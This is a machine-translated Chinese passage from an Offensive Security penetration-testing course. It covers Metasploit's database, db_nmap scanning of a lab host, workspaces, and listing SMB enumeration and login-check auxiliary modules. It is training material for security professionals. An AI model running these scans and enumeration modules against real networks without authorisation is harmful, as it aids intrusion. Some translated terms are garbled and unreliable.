<div style="position:absolute;top:75803;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务名称 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-s</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 以及更多信息，如</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">services -h</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的帮助输出所示</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:75838;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务 -h</font></font></font></b></nobr></div>
<div style="position:absolute;top:75872;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用法：服务 [-h] [-u] [-a] [-r &lt;proto&gt;] [-p &lt;port1,port2&gt;] [-s &lt;name1,name2&gt;] [-o</font></font></nobr></div>
<div style="position:absolute;top:75889;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;文件名&gt;] [addr1 addr2 ...]</font></font></nobr></div>
<div style="position:absolute;top:75923;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-a,--添加    </font></font></nobr></div>
<div style="position:absolute;top:75923;left:271"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添加服务而不是搜索</font></font></nobr></div>
<div style="position:absolute;top:75940;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-d,--delete 删除服务而不是搜索</font></font></nobr></div>
<div style="position:absolute;top:75957;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-c &lt;col1,col2&gt; 只显示给定的列</font></font></nobr></div>
<div style="position:absolute;top:75974;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-h,--帮助    </font></font></nobr></div>
<div style="position:absolute;top:75974;left:271"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示此帮助信息</font></font></nobr></div>
<div style="position:absolute;top:75991;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-s &lt;名称&gt;    </font></font></nobr></div>
<div style="position:absolute;top:75991;left:271"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要添加的服务的名称</font></font></nobr></div>
<div style="position:absolute;top:76008;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-p &lt;端口&gt;    </font></font></nobr></div>
<div style="position:absolute;top:76008;left:271"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索端口列表</font></font></nobr></div>
<div style="position:absolute;top:76025;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-r &lt;protocol&gt; 添加的服务的协议类型 [tcp|udp]</font></font></nobr></div>
<div style="position:absolute;top:76042;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-u,--up    </font></font></nobr></div>
<div style="position:absolute;top:76042;left:271"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只显示已启动的服务</font></font></nobr></div>
<div style="position:absolute;top:76059;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-o &lt;文件&gt;    </font></font></nobr></div>
<div style="position:absolute;top:76059;left:271"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将输出发送到 csv 格式的文件</font></font></nobr></div>
<div style="position:absolute;top:76076;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-O &lt;column&gt; 按指定的列号对行进行排序 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:76207;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="65"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 65 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:76240;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:77317;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:77317;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:77317;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">682</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:76336;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-R,--rhosts 根据搜索结果设置 RHOSTS</font></font></nobr></div>
<div style="position:absolute;top:76352;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-S,--search 要过滤的搜索字符串</font></font></nobr></div>
<div style="position:absolute;top:76369;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-U,--update 更新现有服务的数据</font></font></nobr></div>
<div style="position:absolute;top:76386;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:76406;left:323"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 741 - 服务命令帮助菜单</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:76435;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">除了简单的 TCP 端口扫描器，我们还可以使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">db_nmap</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包装器来执行 Nmap</font></font></nobr></div>
<div style="position:absolute;top:76455;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Metasploit 内部并将结果保存到数据库中以方便访问。</font><font style="vertical-align: inherit;">该</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">db_nmap</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font></font></nobr></div>
<div style="position:absolute;top:76474;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与 Nmap 具有相同的语法，如下所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:76509;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 &gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">db_nmap</font></font></font></b></nobr></div>
<div style="position:absolute;top:76526;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 用法：db_nmap [--save | </font><font style="vertical-align: inherit;">[--帮助 | </font><font style="vertical-align: inherit;">-h]] [nmap 选项]</font></font></nobr></div>
<div style="position:absolute;top:76560;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 &gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">db_nmap 10.11.0.22 -A -Pn</font></font></font></b></nobr></div>
<div style="position:absolute;top:76577;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] Nmap：10.11.0.22 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:76594;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] Nmap：主机已启动（0.00054 秒延迟）。</font></font></nobr></div>
<div style="position:absolute;top:76611;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] Nmap：未显示：996 个关闭端口</font></font></nobr></div>
<div style="position:absolute;top:76627;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] Nmap：港口状态服务版本</font></font></nobr></div>
<div style="position:absolute;top:76644;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] Nmap: 80/tcp 打开 http</font></font></nobr></div>
<div style="position:absolute;top:76662;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] Nmap: |_http-generator: Flexense HTTP v10.0.28</font></font></nobr></div>
<div style="position:absolute;top:76679;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] Nmap: |_http-title: Sync Breeze Enterprise @ client251</font></font></nobr></div>
<div style="position:absolute;top:76696;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] Nmap: 135/tcp 打开 msrpc    </font></font></nobr></div>
<div style="position:absolute;top:76696;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">微软视窗RPC</font></font></nobr></div>
<div style="position:absolute;top:76712;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] Nmap: 139/tcp 打开 netbios-ssn Microsoft Windows netbios-ssn</font></font></nobr></div>
<div style="position:absolute;top:76729;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] Nmap: 445/tcp 打开 microsoft-ds？</font></font></nobr></div>
<div style="position:absolute;top:76746;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] Nmap: 3389/tcp 打开 ms-wbt-server 微软终端服务</font></font></nobr></div>
<div style="position:absolute;top:76763;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:76783;left:283"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 742 - 在 Metasploit 中执行 Nmap 扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:76812;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要显示到目前为止发现的所有主机，我们可以发出</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hosts</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font><font style="vertical-align: inherit;">作为附加</font></font></nobr></div>
<div style="position:absolute;top:76832;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，我们还可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">services -p 445</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">列出在端口 445 上运行的所有服务</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:76867;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机</font></font></font></b></nobr></div>
<div style="position:absolute;top:76900;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机</font></font></nobr></div>
<div style="position:absolute;top:76917;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">======</font></font></nobr></div>
<div style="position:absolute;top:76951;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">地址    </font></font></nobr></div>
<div style="position:absolute;top:76951;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">苹果电脑    </font></font></nobr></div>
<div style="position:absolute;top:76951;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称 os_name    </font></font></nobr></div>
<div style="position:absolute;top:76951;left:595"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">os_flavor os_sp 目的</font></font></nobr></div>
<div style="position:absolute;top:76968;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------    </font></font></nobr></div>
<div style="position:absolute;top:76968;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---    </font></font></nobr></div>
<div style="position:absolute;top:76968;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- -------    </font></font></nobr></div>
<div style="position:absolute;top:76968;left:595"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">------- ----- -------</font></font></nobr></div>
<div style="position:absolute;top:76985;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.22 00:0c:29:ae:3e:22    </font></font></nobr></div>
<div style="position:absolute;top:76985;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">窗户长角牛    </font></font></nobr></div>
<div style="position:absolute;top:76985;left:741"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设备    </font></font></nobr></div>
<div style="position:absolute;top:77019;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务 -p 445</font></font></font></b></nobr></div>
<div style="position:absolute;top:77053;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务</font></font></nobr></div>
<div style="position:absolute;top:77070;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">========</font></font></nobr></div>
<div style="position:absolute;top:77104;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主持人    </font></font></nobr></div>
<div style="position:absolute;top:77104;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口原型名称    </font></font></nobr></div>
<div style="position:absolute;top:77104;left:465"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">状态信息</font></font></nobr></div>
<div style="position:absolute;top:77121;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----    </font></font></nobr></div>
<div style="position:absolute;top:77121;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- ----- ----    </font></font></nobr></div>
<div style="position:absolute;top:77121;left:465"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----- ----</font></font></nobr></div>
<div style="position:absolute;top:77138;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.22 445 tcp microsoft-ds 打开 ()</font></font></nobr></div>
<div style="position:absolute;top:77157;left:302"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 743 - 列出数据库中的主机和服务</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:77186;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了帮助组织数据库中的内容，Metasploit 允许我们将信息存储在单独的</font></font></nobr></div>
<div style="position:absolute;top:77206;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工作区。</font><font style="vertical-align: inherit;">指定工作区时，我们只会看到与该工作区相关的数据库条目</font></font></nobr></div>
<div style="position:absolute;top:77225;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工作区，它帮助我们轻松管理来自各种枚举工作和分配的数据。</font></font></nobr></div>
<div style="position:absolute;top:77245;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用 workspace 列出可用的工作</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">区</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，或者提供</font><font style="vertical-align: inherit;">工作</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">区</font></font></b><font style="vertical-align: inherit;">的名称作为</font></font></nobr></div>
<div style="position:absolute;top:77264;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更改为不同工作区的参数，如清单 744 所示。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:77395;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="66"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 66 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:77428;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:78505;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:78505;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:78505;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">683</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:77526;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工作区</font></font></font></b></nobr></div>
<div style="position:absolute;top:77543;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">测试</font></font></nobr></div>
<div style="position:absolute;top:77560;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* 默认</font></font></nobr></div>
<div style="position:absolute;top:77594;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工作区测试</font></font></font></b></nobr></div>
<div style="position:absolute;top:77611;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 工作区：测试</font></font></nobr></div>
<div style="position:absolute;top:77644;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 &gt; </font></font></nobr></div>
<div style="position:absolute;top:77664;left:314"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 744 - Metasploit 框架中的工作区</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:77694;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要添加或删除工作区，我们可以</font><font style="vertical-align: inherit;">分别</font><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-a</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-d</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，后跟工作区名称。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:77728;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.1.3</font></font></i></nobr></div>
<div style="position:absolute;top:77728;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">辅助模块</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:77766;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Metasploit 框架包括数百个提供功能的辅助模块，例如</font></font></nobr></div>
<div style="position:absolute;top:77785;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为协议枚举、端口扫描、模糊测试、嗅探等。</font><font style="vertical-align: inherit;">这些模块都遵循一个</font></font></nobr></div>
<div style="position:absolute;top:77805;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">常用斜杠分隔的分层语法（</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块类型/操作系统、供应商、应用程序或协议/模块</font></font></i></nobr></div>
<div style="position:absolute;top:77824;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">name</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )，这使得探索和使用模块变得容易。</font><font style="vertical-align: inherit;">辅助模块对许多人有用</font></font></nobr></div>
<div style="position:absolute;top:77843;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">任务，包括信息收集（在收集/层次结构下）、扫描和枚举</font></font></nobr></div>
<div style="position:absolute;top:77863;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">各种服务（在扫描仪/层次结构下），等等。</font></font></nobr></div>
<div style="position:absolute;top:77895;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这里有太多内容无法涵盖，但我们将演示其中一些的语法和操作</font></font></nobr></div>
<div style="position:absolute;top:77915;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最常见的辅助模块。</font><font style="vertical-align: inherit;">作为练习，探索其他一些辅助模块</font></font></nobr></div>
<div style="position:absolute;top:77934;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Metasploit 框架的重要组成部分。</font></font></nobr></div>
<div style="position:absolute;top:77967;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要列出所有辅助模块，我们运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">show 辅助</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font><font style="vertical-align: inherit;">这将呈现一个很长的</font></font></nobr></div>
<div style="position:absolute;top:77986;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所有辅助模块的列表，如下面截断的输出所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:78021;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示辅助</font></font></font></b></nobr></div>
<div style="position:absolute;top:78055;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">辅助的</font></font></nobr></div>
<div style="position:absolute;top:78072;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">==========</font></font></nobr></div>
<div style="position:absolute;top:78106;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称    </font></font></nobr></div>
<div style="position:absolute;top:78106;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">等级说明</font></font></nobr></div>
<div style="position:absolute;top:78123;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----    </font></font></nobr></div>
<div style="position:absolute;top:78123;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- ------------</font></font></nobr></div>
<div style="position:absolute;top:78140;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">……………………………………………………………………………………………………………………………………………………</font></font></nobr></div>
<div style="position:absolute;top:78157;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描仪/smb/smb1    </font></font></nobr></div>
<div style="position:absolute;top:78157;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正常的 SMBv1 协议检测</font></font></nobr></div>
<div style="position:absolute;top:78174;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描仪/smb/smb2    </font></font></nobr></div>
<div style="position:absolute;top:78174;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正常的 SMB 2.0 协议检测</font></font></nobr></div>
<div style="position:absolute;top:78191;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描仪/smb/smb_enumshares    </font></font></nobr></div>
<div style="position:absolute;top:78191;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正常的 SMB 共享枚举</font></font></nobr></div>
<div style="position:absolute;top:78208;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描仪/smb/smb_enumusers    </font></font></nobr></div>
<div style="position:absolute;top:78208;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">普通 SMB 用户枚举 (SAM EnumUsers)</font></font></nobr></div>
<div style="position:absolute;top:78225;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描仪/smb/smb_enumusers_domain 普通SMB域用户枚举</font></font></nobr></div>
<div style="position:absolute;top:78242;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描仪/smb/smb_login    </font></font></nobr></div>
<div style="position:absolute;top:78242;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">普通 SMB 登录检查扫描仪</font></font></nobr></div>
<div style="position:absolute;top:78259;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描仪/smb/smb_lookupsid    </font></font></nobr></div>
<div style="position:absolute;top:78259;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">普通 SMB SID 用户枚举 (LookupSid)</font></font></nobr></div>
<div style="position:absolute;top:78276;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描仪/smb/smb_ms17_010    </font></font></nobr></div>
<div style="position:absolute;top:78276;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正常 MS17-010 SMB RCE 检测</font></font></nobr></div>
<div style="position:absolute;top:78292;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描仪/smb/smb_version    </font></font></nobr></div>
<div style="position:absolute;top:78292;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正常的 SMB 版本检测</font></font></nobr></div>
<div style="position:absolute;top:78310;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">……………………………………………………………………………………………………………………………………………………</font></font></nobr></div>
<div style="position:absolute;top:78329;left:343"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 745 - 列出所有辅助模块</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:78358;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来减少这种可观的输出，按应用程序、类型、平台等进行过滤。</font></font></nobr></div>
<div style="position:absolute;top:78378;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，我们可以搜索 SMB 辅助模块，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索类型为:auxiliary name:smb</font></font></font></b></nobr></div>
<div style="position:absolute;top:78397;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如以下清单所示。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:78432;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索 -h</font></font></font></b></nobr></div>
<div style="position:absolute;top:78449;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用法：搜索 [选项] &lt;关键字&gt; </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:78583;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="67"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 67 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:78616;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:79693;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:79693;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:79693;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">684</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:78728;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项：</font></font></nobr></div>
<div style="position:absolute;top:78745;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-H    </font></font></nobr></div>
<div style="position:absolute;top:78745;left:271"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示此帮助信息</font></font></nobr></div>
<div style="position:absolute;top:78762;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-o &lt;文件&gt;    </font></font></nobr></div>
<div style="position:absolute;top:78762;left:271"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将输出发送到 csv 格式的文件</font></font></nobr></div>
<div style="position:absolute;top:78780;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-S &lt;string&gt; 行过滤器的搜索字符串</font></font></nobr></div>
